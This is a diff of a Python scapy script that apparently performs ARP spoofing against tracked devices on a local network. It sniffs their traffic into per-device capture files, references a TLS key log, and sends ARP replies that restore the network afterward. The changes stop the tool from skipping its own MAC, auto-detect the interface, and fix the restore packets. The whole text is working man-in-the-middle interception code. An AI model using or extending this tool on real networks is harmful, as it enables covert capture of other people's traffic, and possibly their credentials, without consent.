@@ -7,7 +7,7 @@ import sys
 import subprocess
 import re
 
-INTERFACE = "Wi-Fi"
+INTERFACE = scapy.conf.iface.name
 BASE_OUTPUT_DIR = r'C:\Users\User\Downloads\Network_Project'
 TLS_KEYLOG = r'C:\Users\User\sslkeylog.log'
 MY_MAC = None
@@ -53,21 +53,16 @@ def Opacket_handler(pkt):
     if scapy.IP not in pkt:
         return
 
-    if pkt.src == MY_MAC:
-        return 
-
     src_ip = pkt[scapy.IP].src
     dst_ip = pkt[scapy.IP].dst
 
-    for target_ip in tracked_devices:
-        if src_ip == target_ip or dst_ip == target_ip:
-            
-            device_data = Mget_writer_for_device(target_ip)
-            
-            try:
-                device_data['writer'].write(pkt)
-            except Exception:
-                pass
+    for target_ip in list(tracked_devices): 
+            if src_ip == target_ip or dst_ip == target_ip:
+                device_data = Mget_writer_for_device(target_ip)
+                try:
+                    device_data['writer'].write(pkt)
+                except Exception:
+                    pass
 
 def Gstart_sniffer():
     print(f"[*] Sniffer started on {INTERFACE}...")
@@ -99,11 +94,17 @@ def spoof_target(target_ip, gateway_ip):
 def restore_network(gateway_ip):
     print("\n[*] Restoring network...")
     gateway_mac = Aget_mac(gateway_ip)
-    for target_ip in tracked_devices:
+    for target_ip in list(tracked_devices):
         target_mac = Aget_mac(target_ip)
         if target_mac and gateway_mac:
-            res_pkt = scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac)
-            scapy.send(res_pkt, count=4, verbose=False)
+            res_pkt = scapy.Ether(dst=target_mac)/scapy.ARP(
+                op=2, 
+                pdst=target_ip, 
+                psrc=gateway_ip, 
+                hwdst=target_mac, 
+                hwsrc=gateway_mac
+            )
+            scapy.sendp(res_pkt, count=4, verbose=False)
     print("[*] Network restored.")
 
 def main_loop():
